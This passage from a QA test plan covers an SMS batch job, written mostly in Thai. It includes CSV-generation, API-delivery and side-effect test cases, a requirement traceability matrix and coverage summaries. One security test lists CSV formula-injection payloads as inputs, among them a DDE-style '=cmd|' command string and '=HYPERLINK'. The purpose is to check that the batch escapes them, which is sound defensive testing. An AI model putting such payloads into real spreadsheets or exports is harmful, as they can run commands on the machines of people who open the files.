| TC-071 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Side-Effect | reconcile ครบ 100% | รอบที่มีทุกประเภทผลลัพธ์ | 1. seed 20 รายการ (5 DNC, 3 LINE, 2 ซ้ำ, 1 เคยส่ง, 2 E13, 7 สำเร็จ) 2. รัน batch 3. เทียบรายงานกับตาราง | ตารางมี 9 row (7 S + 2 F) · รายงาน total=20 สำเร็จ=7 F=2 ตัดออก=11 (5/3/2/1) · reconcile 100% | 20 records ตามสัดส่วน | P1 | Not Run |  |  | - | FR-016a, SC-007 |
| TC-072 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Side-Effect | ตารางต้นทาง read-only | 9 ตารางต้นทาง | 1. snapshot (checksum+count+max updated_date) 2. รัน batch (สำเร็จ + หยุดกลางคัน) 3. เทียบ snapshot | snapshot เหมือนเดิมทุกตาราง · ไม่มี INSERT/UPDATE/DELETE จาก service account ของ batch | ili_application_osp_*, ili_policy_master, ili_customer_data_analytics, ili_policy_remark, cf_catalog, sms_message_schedule, SMS_CATEGORY | P2 | Not Run |  |  | - | FR-002/005/011/012 · Outline 9 rows |
| TC-073 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Manual Fix (Admin Dashboard) | Side-Effect | Manual Fix ไม่สร้าง log ซ้ำ | 3 รายการเคยส่งแล้ว | 1. seed 3 'S' + 3 CSMS_LOG 2. สั่ง Manual Batch ซ้ำ 2 ครั้ง 3. นับ row | CSMS_LOG คง 3 row · row 'S' คง 3 · credit_amount รวมไม่ถูกนับซ้ำ | 2026-05-15, 3 sent records | P1 | Not Run |  |  | - | FR-020, FR-015, FR-016, EC-004 |
| TC-074 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Alert Email | UX/Usability | email แจ้งเตือนอ่านเข้าใจได้ | รอบล้มเหลว | 1. จำลอง failure 2. เปิด email ที่ได้รับ 3. ตรวจ 7 ข้อ | subject ระบุ batch+failure · เนื้อหาระบุ batch name + ขั้นตอน + วันที่รอบ · ไทยไม่ mojibake · ไม่มี stack trace/PII · ผู้รับตรง distribution list | run_date=2026-05-15, step=Line Connect API down | P2 | Not Run |  |  | - | FR-018, MSG-001, SC-004 |
| TC-075 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Manual Fix (Admin Dashboard) | UX/Usability | หน้า Manual Fix ใช้งานได้ + feedback | IT Admin เปิดหน้า | 1. ตรวจ batch ใน list 2. กรอกผิด กด 3. กรอกถูก กด | batch อยู่ใน list ชื่อสื่อความหมาย · UI เหมือน batch อื่น (ไม่มี UI ใหม่) · validation ใกล้ field + ค่าไม่ถูกล้าง · มี feedback ว่าเริ่มแล้ว · ปุ่ม disable กัน double-submit | batch=BATCH-CSMS-WELCOME-LINE | P2 | Not Run |  |  | - | FR-019, MSG-004, Q-004 · ยกเว้น WCAG/responsive (หน้าจอกลางเดิม) |
| TC-076 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Daily Report | UX/Usability | รายงานอ่านได้ทุกสถานะ | 5 สถานะข้อมูล | 1. เตรียม 5 สถานะ 2. เปิดรายงาน 3. ตรวจการแสดงผล | ปกติ=ยอดครบ+breakdown · 0 รายการ=empty state ไม่ error · วันอนาคต=ยังไม่มีข้อมูล · 'F' สูง=มองเห็นชัด · ค่ายาว=ไม่ล้น layout | ปกติ, ว่าง, อนาคต, F สูง, ค่ายาว | P3 | Not Run |  |  | - | FR-021, Q-006 · ช่องทางเดียวติดตาม 'F' (ไม่มี threshold alert) |
| TC-077 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Interface File (CSV) | CSV Generation | สร้างไฟล์ CSV ก่อนเรียกบริการส่ง | interface dir ว่าง, 3 รายการพร้อมส่ง | 1. ล้าง interface dir 2. รัน batch 3. ตรวจไฟล์ + ลำดับการทำงาน | มีไฟล์ CSV 1 ไฟล์ · สร้าง**ก่อน**เรียกบริการส่ง · มี 3 record | 3 records, run_date=2026-05-16 | P1 | Not Run |  |  | - | **@disputed @csv-path** · FR-013 · **⚠F-001** — ลบทั้งชุดถ้า plan ชนะ |
| TC-078 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Interface File (CSV) | CSV Generation | encoding UTF-8 ไทยไม่เพี้ยน | รายการมีข้อความไทย | 1. seed 4 รูปแบบข้อความไทย 2. รัน batch 3. อ่านไฟล์กลับด้วย UTF-8 | ไฟล์เป็น UTF-8 · อ่านกลับตรงทุกตัวอักษร · ไม่มี mojibake/"?" | สมชาย ใจดี, ข้อความเต็ม, ก้ำกึ่ง, นาย/นาง/นางสาว | P1 | Not Run |  |  | - | **@disputed @csv-path** · FR-013 · BOM ไม่ระบุใน spec |
| TC-079 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Interface File (CSV) | CSV Generation | naming convention + ปี พ.ศ. 2 หลัก | เวลาสร้างไฟล์ต่างกัน | 1. ตั้งเวลา 4 ค่า 2. รัน batch 3. เทียบชื่อไฟล์ | ชื่อ = MKT_CSMS_MKTWelcomeNewCust_[YYMMDDhhmmss].csv | 2026-05-16 10:00:00 → 260516100000 (ตัวอย่าง spec) | P1 | Not Run |  |  | - | **@disputed @csv-path** · FR-013, Q-007 · **⚠F-009** พ.ศ. vs ค.ศ. ขัดกันเองใน FR-013 |
| TC-080 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Interface File (CSV) | CSV Generation | ลำดับ/เนื้อหาคอลัมน์ | 1 รายการพร้อมส่ง | 1. รัน batch 2. เปิดไฟล์ 3. เทียบ column contract | คอลัมน์ครบเรียงตามที่กำหนด · comma/quote/newline escape ตาม RFC 4180 | 2445901/สมชาย ใจดี/0845012341 | P2 | Not Run |  |  | - | **@disputed @csv-path** · FR-013, FR-016 · **⚠F-010 BLOCKED** spec ไม่ระบุ column list |
| TC-081 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Interface File (CSV) | Notification | generate ไฟล์ล้มเหลว → หยุดรอบ + email | 5 รายการพร้อมส่ง | 1. จำลอง 5 สาเหตุ 2. รัน batch 3. ตรวจ SMS + email | ไม่เรียกบริการส่ง (0 SMS) · email ระบุ batch + "generate ไฟล์ไม่ได้" · ซ่อมผ่าน Manual Fix ได้ | disk full, no permission, dir ไม่มี, file locked, timeout | P1 | Not Run |  |  | - | **@disputed @csv-path** · FR-013, FR-018, SC-004 · spec US2 #1,#2 · ⚠F-007 timeout ไม่มีค่า |
| TC-082 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Interface File (CSV) | Security | CSV formula injection | fname มี payload | 1. seed 8 ค่า fname 2. รัน batch 3. เปิดไฟล์ด้วย Excel/LibreOffice | ค่าถูก escape · แสดง literal ไม่ execute สูตร · ไม่มี external reference/command | =1+1, =cmd\|'/c calc'!A1, +1+1, -1+1, @SUM, =HYPERLINK, comma, quote | P2 | Not Run |  |  | - | **@disputed @csv-path** · FR-013 · ไม่มี requirement escaping (ผูก F-002) |
| TC-083 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Interface File (CSV) | Security | PII ในไฟล์ CSV at rest | ไฟล์มีชื่อ+เบอร์ลูกค้าทุกราย | 1. ตรวจ file permission 2. ตรวจการเข้าถึง dir 3. ตรวจ retention 4. ตรวจการเข้ารหัส/ช่องทางส่งต่อ | permission จำกัด (เช่น 0640) · dir ไม่เปิดสาธารณะ · มี retention policy · ระบุการเข้ารหัส at rest · ส่งต่อผ่าน SFTP/TLS | MKT_CSMS_MKTWelcomeNewCust_260516100000.csv | P1 | Not Run |  |  | - | **@disputed @csv-path** · FR-013, PDPA · **⚠F-002 CRITICAL BLOCKED** = checklist G2/CHK026 ตรงตัว |
| TC-084 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Delivery (API) | per-record sendSmsOtp call | 3 รายการพร้อมส่ง | 1. รัน batch 2. นับ HTTP call 3. ตรวจ payload ทุก call | 3 calls (1 ต่อ record) · mappedSystemName='CSMS_SNC_NewCust' · ข้อความ pre-render สมบูรณ์ · เบอร์ตรงกับ mobile_no | 3 records | P1 | Not Run |  |  | - | **@disputed @api-path** · FR-014 · **⚠F-001** — ลบทั้งชุดถ้า spec ชนะ |
| TC-085 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Delivery (API) | per-call refer_no | 3 calls ได้ refer_no ต่างกัน | 1. mock 3 refer_no 2. รัน batch 3. เทียบ CSMS_LOG แต่ละ record | แต่ละ record มี CSMS_LOG + refer_no ของ call ตัวเอง · ไม่สลับ/ไม่ใช้ค่าร่วม · สถานะรายตัวไม่ใช่รวมรอบ | RF...001, RF...002, RF...003 | P1 | Not Run |  |  | - | **@disputed @api-path** · FR-014, FR-015 |
| TC-086 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Delivery (API) | per-call failure → 'F' รอบเดินต่อ | 5 รายการ, record 2 ล้มเหลว | 1. mock 5 รูปแบบ failure ที่ record 2 2. รัน batch 3. ตรวจสถานะทุก record | record 2 = 'F' + sms_sent_date NULL · 1,3,4,5 = 'S' · รอบไม่หยุด · ไม่มี email · ซ่อมผ่าน Manual Fix เท่านั้น | HTTP 500/503/connect timeout/read timeout/ไม่มี refer_no | P1 | Not Run |  |  | - | **@disputed @api-path** · FR-014, FR-016a, FR-020b · **⚠F-006** ไม่มี threshold แยก รายรายการ vs ล่มทั้งระบบ |
| TC-087 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Side-Effect (API) | ยืนยันไม่มีไฟล์ CSV | interface dir ว่างก่อนรัน | 1. ล้าง dir 2. รัน batch ครบรอบ 3. ตรวจ dir + filesystem | dir ยังว่าง · ไม่มี *.csv · ไม่มี .tmp/.part · ไม่มีการเขียนไฟล์จากขั้นตอนส่ง | run ครบรอบสำเร็จ | P2 | Not Run |  |  | - | **@disputed @api-path** · **ขัดกับ FR-013 โดยตรง** — canary ของ F-001 |
| TC-088 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Delivery (API) | N records → N HTTP calls | ปริมาณหลายระดับ | 1. seed 1/100/1000/10000 2. รัน batch 3. นับ call + จับเวลา | call = N ครั้ง · ส่งครบ 100% (SC-001) · เวลาที่ใช้ = [วัดได้แต่ไม่มีเกณฑ์] | 1, 100, 1000, 10000 records | P2 | Not Run |  |  | - | **@disputed @api-path** · FR-014, SC-001 · **⚠F-005 ไม่มีเกณฑ์ผ่าน/ตก** (G1/G4) · เกี่ยวโยง TC-057 |

---

## Coverage Summary

### ความครอบคลุมข้อกำหนด (Requirement Coverage)

| หมวด | จำนวน | มี ≥1 TC | Coverage % |
|---|---|---|---|
| Functional Requirements (FR) | 27 | 27 | **100%** |
| Success Criteria (SC) | 7 | 7 | **100%** |
| **รวม** | **34** | **34** | **100%** |

**รายการ FR ทั้งหมด (27)**: FR-001, FR-002, FR-003, FR-004, FR-005, FR-006, FR-007, FR-008, FR-008a, FR-008b, FR-009, FR-010, FR-011, FR-011a, FR-012, FR-012a, FR-013, FR-014, FR-015, FR-016, FR-016a, FR-017, FR-018, FR-019, FR-020, FR-020a, FR-020b, FR-021
*(FR-021 เป็นข้อสุดท้าย — spec ใช้ suffix a/b จึงมี 27 ข้อจากเลข FR-001..FR-021)*

### Traceability Matrix (FR/SC → TC)

| Requirement | TCs | จำนวน |
|---|---|---|
| FR-001 | TC-001, TC-020, TC-025, TC-053, TC-055, TC-057 | 6 |
| FR-002 | TC-002, TC-025, TC-026, TC-027, TC-044, TC-067, TC-072 | 7 |
| FR-003 | TC-003, TC-028, TC-045 | 3 |
| FR-004 | TC-004, TC-029, TC-050 | 3 |
| FR-005 | TC-005, TC-025, TC-030, TC-031, TC-032, TC-062, TC-067, TC-071, TC-072 | 9 |
| FR-006 | TC-006, TC-007, TC-008, TC-025, TC-054, TC-066, TC-071 | 7 |
| FR-007 | TC-006, TC-009 | 2 |
| FR-008 | TC-033, TC-039, TC-069, TC-071 | 4 |
| FR-008a | TC-034, TC-039 | 2 |
| FR-008b | TC-035, TC-070 | 2 |
| FR-009 | TC-010, TC-025, TC-046, TC-049, TC-067, TC-071 | 6 |
| FR-010 | TC-011, TC-025, TC-056, TC-071 | 4 |
| FR-011 | TC-012, TC-013, TC-043, TC-048, TC-065, TC-072 | 6 |
| FR-011a | TC-036, TC-039 | 2 |
| FR-012 | TC-014, TC-025, TC-047, TC-048, TC-059, TC-064, TC-065, TC-072 | 8 |
| FR-012a | TC-037, TC-070 | 2 |
| **FR-013** ⚠ | TC-077, TC-078, TC-079, TC-080, TC-081, TC-082, TC-083, TC-087 | 8 *(disputed)* |
| FR-014 | TC-015, TC-025, TC-041, TC-084, TC-085, TC-086, TC-087, TC-088 | 8 |
| FR-015 | TC-016, TC-025, TC-042, TC-060, TC-070, TC-073, TC-085 | 7 |
| FR-016 | TC-017, TC-025, TC-051, TC-060, TC-061, TC-067, TC-073, TC-080 | 8 |
| FR-016a | TC-018, TC-025, TC-039, TC-041, TC-071, TC-086 | 6 |
| FR-017 | TC-019, TC-051 | 2 |
| FR-018 | TC-020, TC-053, TC-070, TC-074, TC-081 | 5 |
| FR-019 | TC-021, TC-038, TC-052, TC-058, TC-063, TC-075 | 6 |
| FR-020 | TC-022, TC-055, TC-058, TC-073 | 4 |
| FR-020a | TC-023, TC-052 | 2 |
| FR-020b | TC-040, TC-086 | 2 |
| FR-021 | TC-024, TC-053, TC-068, TC-071, TC-076 | 5 |
| SC-001 | TC-001, TC-025, TC-088 | 3 |
| SC-002 | TC-006, TC-008, TC-030, TC-031, TC-062 | 5 |
| SC-003 | TC-010, TC-011, TC-022, TC-049, TC-055, TC-056 | 6 |
| SC-004 | TC-020, TC-070, TC-074, TC-081 | 4 |
| SC-005 | TC-014, TC-047 | 2 |
| SC-006 | TC-033, TC-069 | 2 |
| SC-007 | TC-024, TC-071, TC-076 | 3 |

### จำนวน TC แยกตาม Dimension (ครบทั้ง 7 มิติ)

| # | Test Dimension | จำนวน TC | TC IDs |
|---|---|---|---|
| 1 | **Positive** | **31** | TC-001…TC-025, TC-077, TC-078, TC-079, TC-080, TC-084, TC-085 |
| 2 | **Negative/Validation** | **20** | TC-026…TC-043, TC-081, TC-086 |
| 3 | **Edge** | **12** | TC-044…TC-054, TC-088 |
| 4 | **Concurrency** | **4** | TC-055, TC-056, TC-057, TC-058 |
| 5 | **Security** | **12** | TC-059…TC-068, TC-082, TC-083 |
| 6 | **Side-Effects** | **6** | TC-069…TC-073, TC-087 |
| 7 | **UX/Usability** | **3** | TC-074, TC-075, TC-076 |
| | **รวม** | **88** | |

**ไม่มี dimension ใดถูกละเว้น** — ครบทั้ง 7 มิติ

**ข้อยกเว้นระดับ sub-area (พร้อมเหตุผล 1 บรรทัด)**:
- **UX/Usability — WCAG AA / responsive-mobile**: ยกเว้นเฉพาะส่วนนี้ เพราะ Manual Fix และรายงานใช้**หน้าจอกลางเดิมของ CSMS** ที่อยู่นอก scope ของ feature นี้ (Q-004 Closed: "ไม่ออกแบบ UI ใหม่ เพียงเพิ่ม batch เข้า list") ⇒ accessibility เป็นความรับผิดชอบของ owner หน้าจอเดิม · **ไม่ได้ยกเว้นทั้ง dimension** — TC-074/075/076 ยังครอบ email + Manual Fix + รายงานเต็มที่

### จำนวน TC แยกตาม Priority

| Priority | จำนวน | สัดส่วน |
|---|---|---|
| P1 (smoke/critical path) | 58 | 65.9% |
| P2 (regression) | 27 | 30.7% |
| P3 (nice-to-have) | 3 | 3.4% |

> **สัดส่วน P1 สูงผิดปกติ (65.9%) โดยตั้งใจ** — เพราะ **ทุก FR ที่แตะ `card_no` ถูกยกเป็น P0/P1 ตามกฎ PDPA** (`risk-analysis` §"หมายเหตุการยกระดับ") ประกอบกับมี finding เปิดอยู่ 10 ข้อ · ไม่ใช่การให้ P1 เฟ้อ แต่สะท้อนว่า feature นี้แตะเลขบัตรประชาชนแทบทุกขั้นตอน

### จำนวน TC แยกตาม Test Level

| Test Level | จำนวน |
|---|---|
| Unit | 1 |
| Integration | 77 |
| E2E | 10 |

> **Unit = 1 เท่านั้น** — สะท้อนลักษณะ feature: เป็น batch ที่ประกอบด้วยการ query ข้ามฐานข้อมูล + เรียกบริการภายนอก (Line Connect / ESB / OMail) แทบทั้งหมด · มีเพียง FR-017 (คำนวณ credit) ที่เป็น pure function ทดสอบระดับ Unit ได้จริง · ⚠ plan.md ระบุเองว่า test coverage ของ epirusapp/esb-fnd-osgi ค่อนข้างบาง (~30%) และมี `[NEEDS CLARIFICATION]` ว่าต้องยกระดับให้ถึง constitution Gate G10 (≥80%) หรือไม่

### TC ที่ Disputed (⚠ ต้องลบชุดใดชุดหนึ่งหลัง SA/PO ตัดสิน)

| ชุด | Tag | จำนวน | TC IDs |
|---|---|---|---|
| CSV-path | `@disputed @csv-path` | **7** | TC-077, TC-078, TC-079, TC-080, TC-081, TC-082, TC-083 |
| API-path | `@disputed @api-path` | **5** | TC-084, TC-085, TC-086, TC-087, TC-088 |
| **รวม disputed** | | **12** (13.6% ของทั้งหมด) | |

### รายการข้อกำหนดที่ยังไม่ถูกครอบคลุม (Uncovered Requirements)

**ไม่มี** — FR ทั้ง 27 ข้อ และ SC ทั้ง 7 ข้อ มี TC ครอบคลุมอย่างน้อย 1 ข้อ (100%)

> ⚠️ **คำเตือนสำคัญ**: `coverage = 100%` หมายถึง **ทุกข้อกำหนดมี TC** — **ไม่ได้** หมายถึงพร้อม execute
> **TC ที่ execute ไม่ได้จนกว่าจะปิด finding** (11 TCs): TC-042 (F-006), TC-043 (F-008), TC-054 (F-005), TC-060/TC-061/TC-066/TC-068 (F-002/F-003), TC-080 (F-010), TC-083 (F-002), TC-088 (F-005) — และ **12 TCs ที่ disputed** ต้องลบครึ่งหนึ่งหลังตัดสิน (F-001)
> **ช่องว่างที่ไม่มี requirement ให้ทดสอบเลย** (ไม่นับเป็น uncovered requirement เพราะไม่มี requirement อยู่ตั้งแต่แรก): security/PII NFR (G2), performance NFR (G1/G4), retry interval + timeout/SLA (G3), edge case ของ Gateway รายรายการ (G5), opt-out ผูกกับ Do Not Contact (F-004), CSV column contract (F-010), normalization rule ของ dedup key, format validation ของ mobile_no, whitelist ของลิงก์แคมเปญ
